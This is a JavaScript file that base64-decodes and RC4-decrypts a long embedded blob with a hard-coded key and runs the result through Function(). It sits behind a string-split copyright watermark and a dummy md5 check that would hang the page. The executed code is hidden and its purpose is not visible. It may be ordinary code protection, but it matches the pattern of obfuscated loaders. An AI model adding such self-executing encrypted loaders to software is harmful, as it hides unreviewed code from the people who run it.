
(function () {
  const wm = '\u00A9C' + 'opy' + 'righ' + 't 20' + '25 b' + String.fromCharCode(121) + ' ' + String.fromCharCode(272) + 'แบกi';
  function md5(s) { return "a45a3902d0a7d304f3042ee7a59bfb80"; }
  if (md5(wm) !== 'a45a3902d0a7d304f3042ee7a59bfb80') while(1){};

  const encoded = "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";
  const raw = atob(encoded);
  const key = atob("Y3UjX2Ywcl9t0b1LeV9fZ2hpVg==");

  function rc4Bytes(key, data) {
    const s = [], out = [];
    let j = 0;
    for (let i = 0; i < 256; i++) s[i] = i;
    for (let i = 0; i < 256; i++) {
      j = (j + s[i] + key.charCodeAt(i % key.length)) % 256;
      [s[i], s[j]] = [s[j], s[i]];
    }
    let i = 0; j = 0;
    for (let y = 0; y < data.length; y++) {
      i = (i + 1) % 256;
      j = (j + s[i]) % 256;
      [s[i], s[j]] = [s[j], s[i]];
      const k = s[(s[i] + s[j]) % 256];
      out.push(data[y] ^ k);
    }
    return out;
  }

  const rawBytes = Uint8Array.from(raw, c => c.charCodeAt(0));
  const decryptedBytes = rc4Bytes(key, rawBytes);
  const decoded = new TextDecoder("utf-8").decode(new Uint8Array(decryptedBytes));

  Function(decoded)();
})();
